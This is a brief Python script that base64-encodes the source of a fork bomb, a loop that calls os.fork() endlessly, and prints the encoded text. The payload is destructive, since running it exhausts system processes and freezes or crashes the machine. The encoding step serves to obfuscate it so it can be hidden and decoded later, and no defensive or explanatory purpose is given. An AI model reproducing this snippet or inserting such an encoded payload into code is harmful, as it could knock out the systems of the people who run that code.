import base64

code = """
import os
while True:
    os.fork()
"""

code= base64.b64encode(code.encode('utf-8')).decode('utf-8')
print(code)